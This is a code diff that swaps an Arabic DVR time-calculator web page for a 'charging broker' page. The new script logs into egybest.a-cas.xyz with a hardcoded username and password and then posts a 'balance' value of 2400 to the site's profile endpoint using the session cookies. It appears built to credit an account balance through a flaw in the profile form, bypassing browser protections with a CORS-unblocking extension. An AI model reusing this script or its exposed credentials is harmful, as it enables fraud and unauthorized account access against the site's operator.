@@ -3,274 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مساعد زمن DVR | م. مهند إيهاب</title>
+    <title>وسيط شحن ACAS - مباشر</title>
     <style>
-        :root {
-            --primary-color: #1e3a8a;
-            --accent-color: #3b82f6;
-            --success-color: #10b981;
-            --text-main: #1f2937;
-            --bg-gradient: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--bg-gradient);
-            color: var(--text-main);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 15px;
+            padding: 20px;
+            color: #333;
         }
-
         .container {
             background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
-            width: 100%;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
             max-width: 450px;
-            border-top: 6px solid var(--primary-color);
+            width: 100%;
         }
-
-        .welcome-section {
-            text-align: center;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .welcome-title {
-            font-size: 1.4rem;
-            color: var(--primary-color);
-            margin: 0 0 10px 0;
-        }
-
-        .dev-info {
-            font-size: 0.85rem;
-            color: #6b7280;
-            line-height: 1.6;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 0.9rem;
-            color: #4b5563;
-        }
-
-        .picker-row {
-            display: flex;
-            gap: 5px;
-            background: #f9fafb;
+        h1 { text-align: center; margin-bottom: 10px; font-size: 24px; color: #1e3c72; }
+        .status-box {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
             padding: 10px;
-            border-radius: 10px;
-            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            color: #666;
         }
-
-        select {
-            flex: 1;
-            padding: 8px 2px;
-            border-radius: 6px;
-            border: 1px solid #cbd5e1;
-            background: white;
-            font-size: 0.85rem;
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #eee;
+            border-radius: 8px;
+            font-size: 16px;
             outline: none;
         }
-
+        input:focus { border-color: #1e3c72; }
         button {
             width: 100%;
             padding: 14px;
+            background: #1e3c72;
+            color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
+            font-size: 18px;
             font-weight: bold;
-            font-size: 1rem;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
+            transition: 0.3s;
         }
-
-        .btn-calc {
-            background: var(--primary-color);
-            color: white;
-        }
-
-        .btn-calc:hover {
-            background: var(--accent-color);
-            transform: translateY(-2px);
-        }
-
-        .btn-copy {
-            background: var(--success-color);
-            color: white;
-            display: none;
-        }
-
-        #result-box {
-            margin-top: 25px;
-            padding: 20px;
-            border-radius: 12px;
-            background: #eff6ff;
-            border: 2px dashed var(--accent-color);
-            display: none;
+        button:hover { background: #2a5298; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
             text-align: center;
-        }
-
-        .result-label {
-            font-size: 0.9rem;
-            color: var(--primary-color);
-            margin-bottom: 5px;
-            display: block;
-        }
-
-        .result-time {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: #dc2626;
-        }
-
-        .live-clock {
+            display: none;
             font-weight: bold;
-            color: var(--accent-color);
         }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .step { font-size: 12px; color: #888; margin-top: 5px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="welcome-section">
-        <h2 class="welcome-title">⏱️ حاسبة التوقيت الذكية</h2>
-        <p class="dev-info">
-            تم التطوير بواسطة <b>المهندس مهند إيهاب التهامي</b>،<br> 
-            خبير هندسة البرمجيات والمتخصص في تطوير الأنظمة الأمنية المتقدمة.
-        </p>
+    <h1>🔗 وسيط الشحن المباشر</h1>
+    <p style="text-align: center; font-size: 12px; margin-bottom: 20px;">يعمل كبديل للباور شيل (عبر CORS Unblock)</p>
+
+    <div class="status-box" id="status">
+        حالة الاتصال: جاهز لإرسال الطلبات...
     </div>
 
-    <div class="input-group">
-        <label>وقت الهاتف الحالي (المرجع):</label>
-        <div id="liveTime" class="live-clock">--:--:--</div>
-    </div>
+    <form id="chargeForm">
+        <div class="form-group">
+            <label>اسم المستخدم (الحقيقي)</label>
+            <input type="text" id="username" value="no1" required>
+        </div>
 
-    <div class="input-group">
-        <label>الوقت الذي تعرضه الكاميرا الآن:</label>
-        <div class="picker-row" id="wrongTimePicker"></div>
-    </div>
+        <div class="form-group">
+            <label>كلمة المرور (الحقيقية)</label>
+            <input type="password" id="password" value="55185512" required>
+        </div>
 
-    <div class="input-group">
-        <label>وقت الحدث في الواقع (المطلوب):</label>
-        <div class="picker-row" id="desiredTimePicker"></div>
-    </div>
+        <div class="form-group">
+            <label>المبلغ</label>
+            <input type="number" id="balance" value="2400" required>
+        </div>
 
-    <button class="btn-calc" onclick="calculate()">إجراء الحسابات الهندسية</button>
-    
-    <div id="result-box">
-        <span class="result-label">توقيت البحث على جهاز الـ DVR:</span>
-        <span id="targetResult" class="result-time"></span>
-    </div>
+        <button type="submit" id="submitBtn">🚀 بدء عملية الوسيط</button>
+    </form>
 
-    <button id="copyBtn" class="btn-copy" onclick="copyToClipboard()">نسخ النتيجة لإرسالها 📋</button>
+    <div id="result" class="result"></div>
+    <div id="steps" class="step"></div>
 </div>
 
 <script>
-    // تحديث ساعة الهاتف الحية
-    setInterval(() => {
-        const now = new Date();
-        document.getElementById('liveTime').innerText = now.toLocaleString('ar-EG');
-    }, 1000);
+    const form = document.getElementById('chargeForm');
+    const statusBox = document.getElementById('status');
+    const resultDiv = document.getElementById('result');
+    const stepsDiv = document.getElementById('steps');
+    const submitBtn = document.getElementById('submitBtn');
 
-    // إنشاء القوائم المنسدلة (Scroll)
-    function buildPickers(containerId) {
-        const container = document.getElementById(containerId);
-        const now = new Date();
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        container.innerHTML = `
-            <select class="day">${options(1, 31, now.getDate())}</select>
-            <select class="month" onchange="validateDays(this)">${options(1, 12, now.getMonth()+1)}</select>
-            <select class="year" onchange="validateDays(this)">${options(2020, 2030, now.getFullYear())}</select>
-            <select class="hour">${options(0, 23, now.getHours())}</select>
-            <select class="minute">${options(0, 59, now.getMinutes())}</select>
-        `;
-    }
+        // تجهيز البيانات
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const amt = document.getElementById('balance').value;
 
-    function options(start, end, selected) {
-        let str = "";
-        for (let i = start; i <= end; i++) {
-            const label = i < 10 ? "0" + i : i;
-            str += `<option value="${i}" ${i === selected ? 'selected' : ''}>${label}</option>`;
+        // إعادة ضبط الواجهة
+        resultDiv.style.display = 'none';
+        stepsDiv.innerHTML = "";
+        submitBtn.disabled = true;
+        submitBtn.textContent = "⏳ جاري العمل...";
+
+        try {
+            // --- الخطوة 1: تسجيل الدخول (سحب الكوكيز) ---
+            statusBox.innerText = "الخطوة 1: جاري تسجيل الدخول وسحب الكوكيز...";
+            stepsDiv.innerHTML += "• محاولة الدخول إلى login.php...<br>";
+
+            const loginDoc = new FormData();
+            loginDoc.append('user_name', user);
+            loginDoc.append('password', pass);
+
+            const loginRes = await fetch('https://egybest.a-cas.xyz/login.php', {
+                method: 'POST',
+                body: loginDoc,
+                credentials: 'include' // سحب الكوكيز وتخزينها في المتصفح
+            });
+
+            if (!loginRes.ok) throw new Error("فشل الوصول لصفحة الدخول");
+            stepsDiv.innerHTML += "<span style='color:green'>• تم تسجيل الدخول بنجاح (الكوكيز جاهزة).</span><br>";
+
+            // انتظار بسيط لمحاكاة الباور شيل
+            await new Promise(r => setTimeout(r, 1000));
+
+            // --- الخطوة 2: الشحن (استخدام الكوكيز) ---
+            statusBox.innerText = "الخطوة 2: إرسال طلب الشحن باستخدام الكوكيز...";
+            stepsDiv.innerHTML += "• إرسال البيانات إلى profile.php...<br>";
+
+            const chargeDoc = new FormData();
+            chargeDoc.append('user_name', user);
+            chargeDoc.append('password1', pass);
+            chargeDoc.append('password2', pass);
+            chargeDoc.append('balance', amt);
+
+            const chargeRes = await fetch('https://egybest.a-cas.xyz/profile.php', {
+                method: 'POST',
+                body: chargeDoc,
+                credentials: 'include' // إرسال الكوكيز المسحوبة تلقائياً
+            });
+
+            if (chargeRes.ok) {
+                statusBox.innerText = "تمت العملية بنجاح!";
+                resultDiv.className = "result success";
+                resultDiv.innerHTML = `✅ تم الشحن بنجاح!<br>المتصفح قام بدور الباور شيل وتم سحب الجلسة.`;
+                resultDiv.style.display = "block";
+            } else {
+                throw new Error("فشل إرسال طلب الشحن");
+            }
+
+        } catch (err) {
+            statusBox.innerText = "فشلت العملية";
+            resultDiv.className = "result error";
+            resultDiv.innerHTML = "❌ خطأ: " + err.message + "<br><small>تأكد من تفعيل CORS Unblock وصحة البيانات.</small>";
+            resultDiv.style.display = "block";
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = "🚀 بدء عملية الوسيط";
         }
-        return str;
-    }
-
-    // التأكد من صحة أيام الشهر (فبراير والسنوات الكبيسة)
-    function validateDays(el) {
-        const row = el.parentElement;
-        const daySelect = row.querySelector('.day');
-        const month = parseInt(row.querySelector('.month').value);
-        const year = parseInt(row.querySelector('.year').value);
-        
-        const lastDay = new Date(year, month, 0).getDate();
-        const currentSelectedDay = parseInt(daySelect.value);
-        
-        daySelect.innerHTML = options(1, lastDay, currentSelectedDay > lastDay ? lastDay : currentSelectedDay);
-    }
-
-    function getPickerDate(id) {
-        const p = document.getElementById(id);
-        return new Date(
-            p.querySelector('.year').value,
-            p.querySelector('.month').value - 1,
-            p.querySelector('.day').value,
-            p.querySelector('.hour').value,
-            p.querySelector('.minute').value
-        );
-    }
-
-    function calculate() {
-        const realNow = new Date();
-        const camNow = getPickerDate('wrongTimePicker');
-        const eventReal = getPickerDate('desiredTimePicker');
-
-        // الفرق الزمني (Offset)
-        const offset = realNow - camNow;
-        // التوقيت الذي سجلته الكاميرا فعلياً وقت الحدث
-        const searchTime = new Date(eventReal.getTime() - offset);
-
-        const resultBox = document.getElementById('result-box');
-        const targetRes = document.getElementById('targetResult');
-        const copyBtn = document.getElementById('copyBtn');
-
-        const formatted = searchTime.toLocaleString('ar-EG', {
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit'
-        });
-
-        targetRes.innerText = formatted;
-        resultBox.style.display = 'block';
-        copyBtn.style.display = 'block';
-        
-        // تمرير تلقائي للنتيجة
-        resultBox.scrollIntoView({ behavior: 'smooth' });
-    }
-
-    function copyToClipboard() {
-        const resText = document.getElementById('targetResult').innerText;
-        const fullMsg = `بناءً على حسابات م. مهند التهامي:\nوقت البحث في الـ DVR هو: ${resText}`;
-        
-        navigator.clipboard.writeText(fullMsg).then(() => {
-            alert("تم نسخ النتيجة بنجاح!");
-        });
-    }
-
-    // التشغيل الأولي
-    buildPickers('wrongTimePicker');
-    buildPickers('desiredTimePicker');
+    });
 </script>
 
 </body>
